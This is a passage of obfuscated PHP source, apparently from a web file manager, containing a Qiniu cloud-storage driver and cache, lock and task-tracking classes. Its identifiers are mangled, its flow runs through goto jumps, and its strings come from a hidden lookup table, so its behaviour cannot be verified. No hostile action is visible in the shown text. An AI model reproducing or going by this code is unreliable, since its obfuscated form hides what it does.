DãĞÌ¿ç·†; d±ÁŒÒÉèˆ: $eæ‡‡ÑØ¯ª =& $_SERVER[õëù©û]; $D‚‰âÕÙ = trim($D‚‰âÕÙ, $eæ‡‡ÑØ¯ª[8]); $a’ÏÁ¾Àµê = empty($D‚‰âÕÙ) ? $eæ‡‡ÑØ¯ª[33] : $D‚‰âÕÙ . $eæ‡‡ÑØ¯ª[8]; goto e½Úº‹‚ä; DãĞÌ¿ç·†: } public function listAll($F´ïğÒ·ìñ) { $DàÎËñ›¿Ş =& $_SERVER[õëù©û]; $CÕ¿Â—“Õ = $this->fileList($F´ïğÒ·ìñ, 1); $DğÌÒğ½îâ = array(); foreach ($CÕ¿Â—“Õ as $CÎ¢¬¥ç”) { $DğÌÒğ½îâ[$CÎ¢¬¥ç”[$DàÎËñ›¿Ş[28]]] = $CÎ¢¬¥ç”[$DàÎËñ›¿Ş[77]]; } return $this->listAllFiles($F´ïğÒ·ìñ, array_keys($DğÌÒğ½îâ), $DğÌÒğ½îâ); } public function canRead($CÆ‡³«Çğİ) { return $this->exist($CÆ‡³«Çğİ) ? !0 : !1; } public function canWrite($d˜¿‹ÔéŠé) { return $this->exist($d˜¿‹ÔéŠé) ? !0 : !1; } public function getContent($fĞ˜ÇÄñ‘–) { return $this->fileSubstr($fĞ˜ÇÄñ‘–, 0, -1); } public function setContent($f‘ãÚÖİø·, $Cî¡©¡™š° = '') { $aøŞïêğø = $this->tempFile($this->pathThis($f‘ãÚÖİø·)); file_put_contents($aøŞïêğø, $Cî¡©¡™š°); if ($this->upload($f‘ãÚÖİø·, $aøŞïêğø)) { $this->tempFileRemve($aøŞïêğø); return !0; } return !1; } public function refreshUrls($eø¬†‘¯º) { goto Eººƒ‰Ê‹–; dè´Ä²ØÎ: return $Bö—¶¬òÜÆ[$b‡ÍºÊ‰ÖÈ[1202]] == $b‡ÍºÊ‰ÖÈ[691] ? !0 : !1; goto FİĞÌŞóº; Eººƒ‰Ê‹–: $b‡ÍºÊ‰ÖÈ =& $_SERVER[õëù©û]; $Eˆø¢¾Óè˜ = array(); if (is_array($eø¬†‘¯º)) { foreach ($eø¬†‘¯º as $CŒÈŒÌ¤ä¤) { $Eˆø¢¾Óè˜[] = $this->link($CŒÈŒÌ¤ä¤); } } else { $Eˆø¢¾Óè˜[] = $this->link($eø¬†‘¯º); } goto A š¶ˆ†ë¢; A š¶ˆ†ë¢: $D ñÄ¥ °æ = new Qiniu\Cdn\CdnManager($this->auth); list($Bö—¶¬òÜÆ, $AÎøÉ–„¡ ) = $D ñÄ¥ °æ->refreshUrls($Eˆø¢¾Óè˜); if ($AÎøÉ–„¡ ) { return !1; } goto dè´Ä²ØÎ; FİĞÌŞóº: } public function fileSubstr($a¦™Éœ²Ô–, $f¥¯ö…Õ·Î, $aóó˜Ü‡ÏÖ) { $d†®¿ˆæ©» =& $_SERVER[õëù©û]; if (!($eØÙ‡áµ™ = $this->link($a¦™Éœ²Ô–))) { return !1; } $C‹Öƒê’ÅŒ = !1; if ($aóó˜Ü‡ÏÖ > 0) { $E¢ÍËèáà² = $f¥¯ö…Õ·Î + $aóó˜Ü‡ÏÖ - 1; $C‹Öƒê’ÅŒ = array($d†®¿ˆæ©»[1203] . $f¥¯ö…Õ·Î . $d†®¿ˆæ©»[407] . $E¢ÍËèáà²); } $fæäÉºË½î = url_request($eØÙ‡áµ™, $d†®¿ˆæ©»[212], !1, $C‹Öƒê’ÅŒ); return $fæäÉºË½î[$d†®¿ˆæ©»[684]] ? $fæäÉºË½î[$d†®¿ˆæ©»[1025]] : !1; } public function upload($D¨ğÎï˜¼, $BÊ’„ĞçÒ«, $c·Èï é« = false, $aÁô»é™‚ = REPEAT_REPLACE) { $fâ„Ô¼Œ = new Qiniu\Storage\UploadManager(); $B„£ˆ†íÅ§ = $this->auth->uploadToken($this->bucket, $D¨ğÎï˜¼); $cĞ»Ö»š¡ = get_file_mime(get_path_ext($BÊ’„ĞçÒ«)); list($EéÙôÑ èÌ, $A¡ÊËÚÍƒ) = $fâ„Ô¼Œ->putFile($B„£ˆ†íÅ§, $D¨ğÎï˜¼, $BÊ’„ĞçÒ«, null, $cĞ»Ö»š¡); return $A¡ÊËÚÍƒ ? !1 : $this->getPathOuter($D¨ğÎï˜¼); } public function uploadFormData($A¼ø¹ŠÖÍ‡, $aìø­ù…šª = 3600) { return $this->uploadToken($A¼ø¹ŠÖÍ‡, $aìø­ù…šª); } public function multiUploadFormData($F¶à°ß˜², $dìšŸµÁä = 3600) { return $this->uploadToken($F¶à°ß˜², $dìšŸµÁä); } private function uploadToken($C¿øÔ¥ßñ, $fŠê°±Á‹« = 3600) { goto D—†¤òÇÃ; FÜÁ½–¿÷ø: $dºØ‰Ú°Ë¿ = null; $aò…Œ‰± = $this->auth->uploadToken($this->bucket, $dºØ‰Ú°Ë¿, $A•óÚ¼åö³, $f«¾÷¸ÏË, !0); $b‚˜“à‘´ = empty($this->region) || $this->region == $B‡©Ø¼—šÕ[1206] ? $B‡©Ø¼—šÕ[33] : $B‡©Ø¼—šÕ[407] . $this->region; goto dƒ¬¾Å÷±; D—†¤òÇÃ: $B‡©Ø¼—šÕ =& $_SERVER[õëù©û]; $A•óÚ¼åö³ = $fŠê°±Á‹«; $f«¾÷¸ÏË = array($B‡©Ø¼—šÕ[1204] => $B‡©Ø¼—šÕ[1205]); goto FÜÁ½–¿÷ø; dƒ¬¾Å÷±: $Fêòç±ğØê = http_type() . "\x3a\57\x2f\x75\160\x6c\157\x61\144{$b‚˜“à‘´}\x2e\x71\x69\x6e\x69\165\x70\56\x63\x6f\x6d\x2f"; return array($B‡©Ø¼—šÕ[1207] => $aò…Œ‰±, $B‡©Ø¼—šÕ[1208] => $Fêòç±ğØê); goto Ağ„÷«©‚; Ağ„÷«©‚: } public function download($aÌ·´‚Û“Æ, $c´Å¬¥¡Ğè) { goto c¥ê˜ÃÅ„·; BÍ´¦®­–: fclose($D²‡§àéšŠ); return $c´Å¬¥¡Ğè; goto aß‡ÎÏ÷ÃÁ; c¥ê˜ÃÅ„·: $CÎßŒƒï½µ = IO::getPathInner(IO::mkfile($c´Å¬¥¡Ğè)); if (!($a‚’¨œíİ… = $this->link($aÌ·´‚Û“Æ))) { return !1; } $dÒ¸£ó¯ŠĞ = 0; goto fÙ÷‹ããïÂ; fÙ÷‹ããïÂ: $Dº¹İß¸¶ª = 1024 * 200; $D²‡§àéšŠ = fopen($CÎßŒƒï½µ, $_SERVER[õëù©û][1209]); while (!0) { $a§£ŞÜ¼ = $this->fileSubstr($aÌ·´‚Û“Æ, $dÒ¸£ó¯ŠĞ, $Dº¹İß¸¶ª); if ($a§£ŞÜ¼ === !1) { return !1; } fwrite($D²‡§àéšŠ, $a§£ŞÜ¼); $dÒ¸£ó¯ŠĞ += $Dº¹İß¸¶ª; if (strlen($a§£ŞÜ¼) < $Dº¹İß¸¶ª) { break; } } goto BÍ´¦®­–; aß‡ÎÏ÷ÃÁ: } public function link($bĞ¸Æ“³õ­, $aª‡ÙÌØ…ö = '') { if (!$this->isFile($bĞ¸Æ“³õ­)) { return !1; } $a’ÏÍ˜—İ = $this->getHost() . $_SERVER[õëù©û][8] . $this->pathEncode($bĞ¸Æ“³õ­) . $aª‡ÙÌØ…ö; return $this->auth->privateDownloadUrl($a’ÏÍ˜—İ, 3600 * 12); } public function fileOut($a…Ü’Ò¢Ëˆ, $c“…ĞñÄ‡ = false, $C’¯ø±‘ª¶ = false, $C¡ŠÌîœèµ = '') { $B½Ü‚›Ñ“¯ =& $_SERVER[õëù©û]; if (!$C’¯ø±‘ª¶) { $C’¯ø±‘ª¶ = $this->pathThis($a…Ü’Ò¢Ëˆ); } $c¡ßÇî½¶á = $c“…ĞñÄ‡ ? $B½Ü‚›Ñ“¯[1210] . rawurlencode($C’¯ø±‘ª¶) : $B½Ü‚›Ñ“¯[33]; $A¼æÎµéÕ = $this->link($a…Ü’Ò¢Ëˆ, $c¡ßÇî½¶á); $this->fileOutLink($A¼æÎµéÕ); } public function fileOutServer($E÷İéºÌ¬, $D‰œÈ çÇ = false, $a¥ê±Ãš”§ = false, $e¥ÀÖËá–× = '') { parent::fileOut($E÷İéºÌ¬, $D‰œÈ çÇ, $a¥ê±Ãš”§, $e¥ÀÖËá–×); } public function fileOutImage($Dî¥‘À²òî, $e±™öé˜Î = 250) { $C˜²£§ãê³ = $this->link($Dî¥‘À²òî, $_SERVER[õëù©û][1211] . $e±™öé˜Î); $this->fileOutLink($C˜²£§ãê³); } public function fileOutImageServer($fªíÏöÈºˆ, $B‚õœ„ˆª¤ = 250) { parent::fileOutImage($fªíÏöÈºˆ, $B‚õœ„ˆª¤); } public function hashMd5($CŸ±ĞŸ¤ù) { $bÀŠÖäç¿˜ =& $_SERVER[õëù©û]; $fö¤¬ÖØƒë = $this->objectMeta($CŸ±ĞŸ¤ù); return isset($fö¤¬ÖØƒë[$bÀŠÖäç¿˜[192]]) ? $fö¤¬ÖØƒë[$bÀŠÖäç¿˜[192]] : !1; $e™ËÚæ‚ = $this->link($CŸ±ĞŸ¤ù, $bÀŠÖäç¿˜[1212]); } public function size($d¨©‘ê§¾) { $B‡Ù÷­ğÎµ = $this->objectMeta($d¨©‘ê§¾); return $B‡Ù÷­ğÎµ ? $B‡Ù÷­ğÎµ[$_SERVER[õëù©û][77]] : 0; } public function info($FŠ„Ğ«®µà) { if ($this->isFolder($FŠ„Ğ«®µà)) { return $this->folderInfo($FŠ„Ğ«®µà); } else { if ($this->isFile($FŠ„Ğ«®µà)) { return $this->fileInfo($FŠ„Ğ«®µà); } } return !1; } public function exist($AÈóë²ù›Š) { return $this->isFile($AÈóë²ù›Š) || $this->isFolder($AÈóë²ù›Š); } public function isFile($fõšâÔ¦) { return !$this->isFolder($fõšâÔ¦) && $this->objectMeta($fõšâÔ¦); } public function isFolder($d¨“Ë…Ì …) { return $this->cacheMethod($_SERVER[õëù©û][219], $d¨“Ë…Ì …); } protected function objectMeta($f™ì‚Úõ‹) { return $this->cacheMethod($_SERVER[õëù©û][220], $f™ì‚Úõ‹); } protected function _objectMeta($fÅ®øÄ”Úã) { $CÊïÙ…ß£Õ =& $_SERVER[õëù©û]; list($CôÙá‡›œõ, $Cº©‰ì³ÓÔ) = $this->bucketManager->stat($this->bucket, $fÅ®øÄ”Úã); if ($CôÙá‡›œõ) { $CôÙá‡›œõ[$CÊïÙ…ß£Õ[77]] = intval($CôÙá‡›œõ[$CÊïÙ…ß£Õ[1199]]); } return $CôÙá‡›œõ; } protected function _isFolder($d¦Ã…ìÁ°¤) { $aèë³³˜‹ =& $_SERVER[õëù©û]; list($e ˜¥‰¨‚Œ, $BøÍŠ•ŠÊˆ) = $this->bucketManager->listFiles($this->bucket, trim($d¦Ã…ìÁ°¤, $aèë³³˜‹[8]) . $aèë³³˜‹[8], $aèë³³˜‹[33], 1, $aèë³³˜‹[8]); return !empty($e ˜¥‰¨‚Œ[$aèë³³˜‹[1198]]) || !empty($e ˜¥‰¨‚Œ[$aèë³³˜‹[1201]]) ? !0 : !1; } } goto BŒŒ¼‹¨ù•; fÇÎäÓŸ«Â: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($D³¯ƒÖŸ†, $Eæóäİã÷À) { $e±ğîĞÂ†ø =& $_SERVER[õëù©û]; $this->cachePath = $D³¯ƒÖŸ†[$e±ğîĞÂ†ø[75]]; $this->prefix = $e±ğîĞÂ†ø[755]; $this->cacheTime = $Eæóäİã÷À; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($b‡Ï¶É˜±‡) { $cÂ†Ø‚ŸÓµ =& $_SERVER[õëù©û]; $b‡Ï¶É˜±‡ = str_replace(array($cÂ†Ø‚ŸÓµ[756], $cÂ†Ø‚ŸÓµ[93], $cÂ†Ø‚ŸÓµ[69]), $cÂ†Ø‚ŸÓµ[757], $b‡Ï¶É˜±‡); return $this->cachePath . $cÂ†Ø‚ŸÓµ[758] . $b‡Ï¶É˜±‡ . $cÂ†Ø‚ŸÓµ[759]; } public function set($C Œ†é¡, $cĞÚª£¬²Ş, $EªåÜÚ¹ğè = false) { $d‰Å–Ö²Î— = $this->getFile($C Œ†é¡); if (file_put_contents($d‰Å–Ö²Î—, $this->prefix . $cĞÚª£¬²Ş, LOCK_EX)) { return !0; } @unlink($d‰Å–Ö²Î—); return !1; } public function get($cœïİîŒÀ) { $fö£ÂÜœä‚ = $this->getFile($cœïİîŒÀ); if (file_exists($fö£ÂÜœä‚) && filemtime($fö£ÂÜœä‚) < time() - $this->cacheTime) { @unlink($fö£ÂÜœä‚); return !1; } $b–ô ˜÷ = @file_get_contents($fö£ÂÜœä‚); return substr($b–ô ˜÷, strlen($this->prefix)); } public function remove($dâôÏÙßÑ) { $eàÖñ«¤Åİ = $this->getFile($dâôÏÙßÑ); return @unlink($eàÖñ«¤Åİ); } public function deleteAll() { $EˆÓ­öé®å =& $_SERVER[õëù©û]; $Eíô‹’òÊ = scandir($this->cachePath); foreach ($Eíô‹’òÊ as $c‹·™Å”ÀÆ) { $d¢ïø‹İ¤£ = $this->cachePath . $c‹·™Å”ÀÆ; if (strpos($d¢ïø‹İ¤£, $EˆÓ­öé®å[759]) && strpos($d¢ïø‹İ¤£, $EˆÓ­öé®å[760])) { @unlink($d¢ïø‹İ¤£); } } } public function clearTimeout() { $cÑœ¡˜ö­„ =& $_SERVER[õëù©û]; $F„‚Û¯‰¯ = scandir($this->cachePath); foreach ($F„‚Û¯‰¯ as $c¼æÜ …±‡) { $E¼ßÇš÷‘ = $this->cachePath . $c¼æÜ …±‡; if (strpos($E¼ßÇš÷‘, $cÑœ¡˜ö­„[759]) && strpos($E¼ßÇš÷‘, $cÑœ¡˜ö­„[760]) && filemtime($E¼ßÇš÷‘) < time() - $this->cacheTime) { @unlink($E¼ßÇš÷‘); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C½¯ºî“õê; eàáĞ´œ¥: self::$timeout = $Dœ ù‹‹¤Ğ[$AòÙ…šó×[761]] ? $Dœ ù‹‹¤Ğ[$AòÙ…šó×[761]] : 10; $e„ì½Ì¤ = _get($GLOBALS[$AòÙ…šó×[6]], $AòÙ…šó×[762]); $b¡ÄÒ«£®Ğ = $Dœ ù‹‹¤Ğ[$AòÙ…šó×[748]] ? $Dœ ù‹‹¤Ğ[$AòÙ…šó×[748]] : $AòÙ…šó×[163]; goto eí‹¢Ò°®–; eí‹¢Ò°®–: if ($b¡ÄÒ«£®Ğ == $AòÙ…šó×[17] && $e„ì½Ì¤ == $AòÙ…šó×[9]) { $b¡ÄÒ«£®Ğ = $AòÙ…šó×[163]; } switch ($b¡ÄÒ«£®Ğ) { case $AòÙ…šó×[751]: self::$handle = new CacheLockRedis(); break; case $AòÙ…šó×[752]: self::$handle = new CacheLockMemcached(); break; case $AòÙ…šó×[17]: self::$handle = new CacheLockDatabase(); break; case $AòÙ…šó×[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto Dª¦ÚëĞÏÍ; C½¯ºî“õê: $AòÙ…šó× =& $_SERVER[õëù©û]; if (self::$handle) { return self::$handle; } $Dœ ù‹‹¤Ğ = $GLOBALS[$AòÙ…šó×[6]][$AòÙ…šó×[333]]; goto eàáĞ´œ¥; Dª¦ÚëĞÏÍ: } private static function key($BÑ¹Òİ˜Š‹) { return $_SERVER[õëù©û][763] . Cache::key($BÑ¹Òİ˜Š‹); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($F›·¤½Ï’Î = '') { self::$errorMsg = $F›·¤½Ï’Î; } public static function lockGlobal($DÄÕ·»øœõ, $F’å·Î„ÄÃ) { return self::lock($DÄÕ·»øœõ, $F’å·Î„ÄÃ, !0); } public static function lock($DàÄ¾ùÊìÏ, $CäŞ’°ÔÉœ = false, $cÇÅæÍ¾Í = false) { goto eĞøô‹ªÁé; eĞøô‹ªÁé: $c½Ô³İÄê“ =& $_SERVER[õëù©û]; $EÎØß¢¢¡ = self::init(); $BÏ¤Ö¥Àè = self::key($DàÄ¾ùÊìÏ); goto E¯¯¹»İë; fßè¹ØìÇ: if (!$cÇÅæÍ¾Í) { self::$lockItem[$BÏ¤Ö¥Àè] = !0; } return $d Æòˆø·ë; goto Aß˜­‚âİß; E¯¯¹»İë: $CäŞ’°ÔÉœ = $CäŞ’°ÔÉœ ? $CäŞ’°ÔÉœ : self::$timeout; $d Æòˆø·ë = $EÎØß¢¢¡->lock($BÏ¤Ö¥Àè, $CäŞ’°ÔÉœ); if (!$d Æòˆø·ë) { $då£Ü›§ = $c½Ô³İÄê“[764] . $CäŞ’°ÔÉœ . $c½Ô³İÄê“[67] . self::$errorMsg . $c½Ô³İÄê“[67] . get_caller_msg(); $dæÕ·Š—Û = "\x4c\x6f\143\x6b\40\x61\x63\164\151\x6f\156\72\40{$BÏ¤Ö¥Àè}\x20\164\151\155\145\157\x75\x74\54\x6f\166\145\162\x20{$CäŞ’°ÔÉœ}\40\x73"; $dæÕ·Š—Û = self::$errorMsg ? self::$errorMsg : $cçñ«ŸÅÖÍ; write_log($då£Ü›§, $c½Ô³İÄê“[765]); show_json($dæÕ·Š—Û, !1); } goto fßè¹ØìÇ; Aß˜­‚âİß: } public static function lockGet($Còå¤¹“¤ñ) { $C¤©¬ó¹æĞ = self::key($Còå¤¹“¤ñ); if (self::$lockItem[$C¤©¬ó¹æĞ]) { return self::$lockItem[$C¤©¬ó¹æĞ]; } return self::init()->lockGet($C¤©¬ó¹æĞ); } public static function unlock($CÙÄ„ñ¯®) { $dİ©­´ É = self::key($CÙÄ„ñ¯®); self::$lockItem[$dİ©­´ É] = null; return self::init()->unlock($dİ©­´ É); } public static function unlockRuntime() { $bÑ©‘ø =& $_SERVER[õëù©û]; $C‚œ°¨‘Ú = self::init(); $F™ÜöÑ¢™™ = !1; foreach (self::$lockItem as $C‘‰²ÂìÔÏ => $cã‹ğİ‘…İ) { if (!$cã‹ğİ‘…İ) { continue; } $C‚œ°¨‘Ú->unlock($C‘‰²ÂìÔÏ); if (!$F™ÜöÑ¢™™) { $F™ÜöÑ¢™™ = !0; write_log($bÑ©‘ø[766] . $C‘‰²ÂìÔÏ . $bÑ©‘ø[67] . get_caller_msg(), $bÑ©‘ø[765]); continue; } write_log($bÑ©‘ø[766] . $C‘‰²ÂìÔÏ, $bÑ©‘ø[765]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto cÂ…¶ Ÿø; AğÂì¤½Ò: class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($b¼ë¥¯ƒ¬À, $FØ÷İ¹ƒï× = '', $EÚÛã–¬©ë = 0, $d§‘‹§ŸÇ³ = '') { goto f÷ñª½Ñ‡¨; f÷ñª½Ñ‡¨: $Eù‹Øø§ª  =& $_SERVER[õëù©û]; if (self::get($b¼ë¥¯ƒ¬À)) { return; } $this->task = array($Eù‹Øø§ª [363] => $b¼ë¥¯ƒ¬À, $Eù‹Øø§ª [1404] => USER_ID, $Eù‹Øø§ª [1310] => $d§‘‹§ŸÇ³, $Eù‹Øø§ª [29] => $FØ÷İ¹ƒï×, $Eù‹Øø§ª [971] => $Eù‹Øø§ª [33], $Eù‹Øø§ª [969] => $EÚÛã–¬©ë, $Eù‹Øø§ª [981] => 0, $Eù‹Øø§ª [1405] => 0, $Eù‹Øø§ª [1406] => 0, $Eù‹Øø§ª [1407] => timeFloat(), $Eù‹Øø§ª [1408] => 0, $Eù‹Øø§ª [1409] => 0, $Eù‹Øø§ª [1410] => 0, $Eù‹Øø§ª [1411] => 0, $Eù‹Øø§ª [684] => $Eù‹Øø§ª [1368]); goto cË£×Øö¢; cË£×Øö¢: Hook::bind($Eù‹Øø§ª [1370], array($this, $Eù‹Øø§ª [1412])); Hook::bind($Eù‹Øø§ª [1413], array($this, $Eù‹Øø§ª [1414])); $this->startAfter(); goto e…‚ Õà; e…‚ Õà: Hook::trigger($Eù‹Øø§ª [1415], $this->task); $this->task[$Eù‹Øø§ª [1409]] = timeFloat(); self::valueSet($this->task[$Eù‹Øø§ª [363]], $this->task); goto CªÍ™ƒä„; CªÍ™ƒä„: } public function end() { goto eÉ£©¸É˜; cã´´Â·ÌŠ: Hook::unbind($CÕ¹ÚŸ‘Ó´[1413], array($this, $CÕ¹ÚŸ‘Ó´[1414])); $this->endAfter(); $this->task = !1; goto bù›èæòá; eÉ£©¸É˜: $CÕ¹ÚŸ‘Ó´ =& $_SERVER[õëù©û]; if (!$this->task) { return; } if ($this->task[$CÕ¹ÚŸ‘Ó´[1409]]) { self::valueSet($this->task[$CÕ¹ÚŸ‘Ó´[363]], !1); } goto fÕªÁ­Åñ¶; fÕªÁ­Åñ¶: $a»Ü—ö¾ö… = timeFloat() - $this->task[$CÕ¹ÚŸ‘Ó´[1407]]; self::log($CÕ¹ÚŸ‘Ó´[1416] . $this->task[$CÕ¹ÚŸ‘Ó´[363]] . $CÕ¹ÚŸ‘Ó´[1417] . $a»Ü—ö¾ö… . $CÕ¹ÚŸ‘Ó´[1418]); Hook::unbind($CÕ¹ÚŸ‘Ó´[1370], array($this, $CÕ¹ÚŸ‘Ó´[1412])); goto cã´´Â·ÌŠ; bù›èæòá: } public function update($d„Øù¨ƒÛÁ = 0) { goto DŞåÛ£­¿¹; C­ñ†©¢å: $this->updateAfter(); $B¦—Ç¡ƒåæ = 0.2; if (timeFloat() - $E¢†òªÃë£[$e‹òÏŠç÷¬[1409]] < $B¦—Ç¡ƒåæ) { return; } goto fĞÎîÕŠ‘; Eï“ø¥Š¬”: Hook::trigger($e‹òÏŠç÷¬[1422], $E¢†òªÃë£); self::valueSet($E¢†òªÃë£[$e‹òÏŠç÷¬[363]], $E¢†òªÃë£); goto A’î˜œœá²; DŞåÛ£­¿¹: $e‹òÏŠç÷¬ =& $_SERVER[õëù©û]; $E¢†òªÃë£ =& $this->task; if (!$E¢†òªÃë£) { return; } goto b¹Ë‘õ”²À; B†ƒã”å…ô: $E¢†òªÃë£[$e‹òÏŠç÷¬[684]] = $B”Ü†—“¸¨ ? $B”Ü†—“¸¨ : $E¢†òªÃë£[$e‹òÏŠç÷¬[684]]; $E¢†òªÃë£[$e‹òÏŠç÷¬[1410]] = $d–ÏàŠˆ[$e‹òÏŠç÷¬[1410]] ? $d–ÏàŠˆ[$e‹òÏŠç÷¬[1410]] : 0; $E¢†òªÃë£[$e‹òÏŠç÷¬[1409]] = timeFloat(); goto Eï“ø¥Š¬”; b¹Ë‘õ”²À: $E¢†òªÃë£[$e‹òÏŠç÷¬[981]] += $d„Øù¨ƒÛÁ; $E¢†òªÃë£[$e‹òÏŠç÷¬[1408]] = timeFloat(); if ($E¢†òªÃë£[$e‹òÏŠç÷¬[969]]) { if ($E¢†òªÃë£[$e‹òÏŠç÷¬[969]] < $E¢†òªÃë£[$e‹òÏŠç÷¬[981]]) { $E¢†òªÃë£[$e‹òÏŠç÷¬[969]] = $E¢†òªÃë£[$e‹òÏŠç÷¬[981]]; } $b¯ï›ÍÍˆÈ = timeFloat() - $E¢†òªÃë£[$e‹òÏŠç÷¬[1407]] - $E¢†òªÃë£[$e‹òÏŠç÷¬[1410]]; $E¢†òªÃë£[$e‹òÏŠç÷¬[1405]] = $E¢†òªÃë£[$e‹òÏŠç÷¬[981]] / $E¢†òªÃë£[$e‹òÏŠç÷¬[969]]; $E¢†òªÃë£[$e‹òÏŠç÷¬[1406]] = $E¢†òªÃë£[$e‹òÏŠç÷¬[981]] / $b¯ï›ÍÍˆÈ; if ($E¢†òªÃë£[$e‹òÏŠç÷¬[1405]] > 0) { $E¢†òªÃë£[$e‹òÏŠç÷¬[1411]] = $b¯ï›ÍÍˆÈ * (1 - $E¢†òªÃë£[$e‹òÏŠç÷¬[1405]]) / $E¢†òªÃë£[$e‹òÏŠç÷¬[1405]]; } $E¢†òªÃë£[$e‹òÏŠç÷¬[1411]] = $E¢†òªÃë£[$e‹òÏŠç÷¬[1411]] <= 0 ? 0 : $E¢†òªÃë£[$e‹òÏŠç÷¬[1411]]; } goto C­ñ†©¢å; fĞÎîÕŠ‘: $d–ÏàŠˆ = self::get($E¢†òªÃë£[$e‹òÏŠç÷¬[363]]); $B”Ü†—“¸¨ = $d–ÏàŠˆ[$e‹òÏŠç÷¬[684]]; if ($B”Ü†—“¸¨ == self::STATYS_KILL) { $Ešè¨½Ÿ³Ú = array($e‹òÏŠç÷¬[1419] => LNG($e‹òÏŠç÷¬[1420]), $e‹òÏŠç÷¬[1023] => !1); Cache::set($e‹òÏŠç÷¬[1421] . $this->task[$e‹òÏŠç÷¬[363]], $Ešè¨½Ÿ³Ú, 30); $this->end(); die; } else { if ($B”Ü†—“¸¨ == self::STATYS_STOP) { $b†ãË›ä×Ş = 2; $d–ÏàŠˆ[$e‹òÏŠç÷¬[1410]] += $b†ãË›ä×Ş; self::valueSet($E¢†òªÃë£[$e‹òÏŠç÷¬[363]], $d–ÏàŠˆ); sleep($b†ãË›ä×Ş); $this->update(); return; } } goto B†ƒã”å…ô; A’î˜œœá²: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($dÖˆ¡Á¶‰) { $FñÖÁ§µİ© =& $_SERVER[õëù©û]; Cache::set($FñÖÁ§µİ©[1421] . $this->task[$FñÖÁ§µİ©[363]], $dÖˆ¡Á¶‰, 60); return $dÖˆ¡Á¶‰; } public static function get($E´ï¨Äà‡£) { return self::valueGet($E´ï¨Äà‡£); } public static function listData() { $fÚíê¶‡ó» = self::valueGet(); return array_sort_by($fÚíê¶‡ó», $_SERVER[õëù©û][1407], !0); } public static function kill($eÙÕ¶ë˜¦) { return self::changeStatus($eÙÕ¶ë˜¦, self::STATYS_KILL); } public static function stop($B§šØÀôÙ‹) { return self::changeStatus($B§šØÀôÙ‹, self::STATYS_STOP); } public static function restart($a­ÛÁ¼ì«) { return self::changeStatus($a­ÛÁ¼ì«, self::STATYS_RUNNING); } public static function killAll() { $FÙµ¹×‡´” =& $_SERVER[õëù©û]; $c»¾Š¬¬õŠ = self::listData(); foreach ($c»¾Š¬¬õŠ as $Cî›¡ñ®Ìæ) { self::kill($Cî›¡ñ®Ìæ[$FÙµ¹×‡´”[363]]); } sleep(2); foreach ($c»¾Š¬¬õŠ as $Cî›¡ñ®Ìæ) { self::valueSet($Cî›¡ñ®Ìæ[$FÙµ¹×‡´”[363]], !1); } } private static function changeStatus($f ”Î©ğ, $e½öØ®Õ¢ê) { goto FĞñèŠƒ·; FĞñèŠƒ·: $dâÇøœÙƒ =& $_SERVER[õëù©û]; $b‚“¥ßÊ„ = self::valueGet($f ”Î©ğ); if (!$b‚“¥ßÊ„) { return !1; } goto EÇƒÓ©ª”«; EÇƒÓ©ª”«: $b‚“¥ßÊ„[$dâÇøœÙƒ[684]] = $e½öØ®Õ¢ê; self::valueSet($f ”Î©ğ, $b‚“¥ßÊ„); self::log($dâÇøœÙƒ[1423] . $b‚“¥ßÊ„[$dâÇøœÙƒ[363]] . $dâÇøœÙƒ[1424] . $e½öØ®Õ¢ê); goto fŒ¶Œ—ô±; fŒ¶Œ—ô±: return !0; goto eƒæÉÍ…ã¡; eƒæÉÍ…ã¡: } public static function valueGet($DìÇ âÉ»ğ = false) { $eØò„õÌ‰ =& $_SERVER[õëù©û]; if ($DìÇ âÉ»ğ) { $EÉÔ­é¦ = Model($eØò„õÌ‰[394])->where(array($eØò„õÌ‰[89] => $DìÇ âÉ»ğ, $eØò„õÌ‰[29] => $eØò„õÌ‰[1425]))->find(); return $EÉÔ­é¦ ? json_decode($EÉÔ­é¦[$eØò„õÌ‰[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($c²Ñ‚£Í™¬ = false) { goto aÇ—Ê¯ãœß; EÇ¦õØ‹«: return $bôã§‰Œ³; goto A†©Üë»; e›¿Â®: $bôã§‰Œ³ = Model($f„Ê®¸¦´°[394])->where($EÚµ½¿îÅ)->select(); $bôã§‰Œ³ = $bôã§‰Œ³ ? $bôã§‰Œ³ : array(); foreach ($bôã§‰Œ³ as $C’……˜¥ì => $fÑ´Å´¢Œ) { $bôã§‰Œ³[$C’……˜¥ì] = json_decode($fÑ´Å´¢Œ[$f„Ê®¸¦´°[355]], !0); } goto EÇ¦õØ‹«; aÇ—Ê¯ãœß: $f„Ê®¸¦´° =& $_SERVER[õëù©û]; $EÚµ½¿îÅ = array($f„Ê®¸¦´°[29] => $f„Ê®¸¦´°[1425]); if ($c²Ñ‚£Í™¬) { $EÚµ½¿îÅ[$f„Ê®¸¦´°[1404]] = $c²Ñ‚£Í™¬; } goto e›¿Â®; A†©Üë»: } public static function valueSet($e´©ÍÌğ„‘, $d›‡ˆùÛš) { goto c¼º¥æ‘; A …¡ÌÅ: Model($f²‰Õƒğì[394])->add($A¡ù§ó…„‹, array(), !0); goto B°Ûßç¥š; c¼º¥æ‘: $f²‰Õƒğì =& $_SERVER[õëù©û]; if (!$d›‡ˆùÛš) { return Model($f²‰Õƒğì[394])->where(array($f²‰Õƒğì[89] => $e´©ÍÌğ„‘, $f²‰Õƒğì[29] => $f²‰Õƒğì[1425]))->delete(); } $F’ƒÚÄéÄÏ = json_encode($d›‡ˆùÛš); goto bÚ‰óÆÒ¦; bÚ‰óÆÒ¦: if (!$F’ƒÚÄéÄÏ) { ob_start(); var_dump($d›‡ˆùÛš); $C½ÏÙ˜çÃë = ob_get_clean(); self::log($f²‰Õƒğì[1426] . json_encode_force($C½ÏÙ˜çÃë)); } if (!$e´©ÍÌğ„‘ || 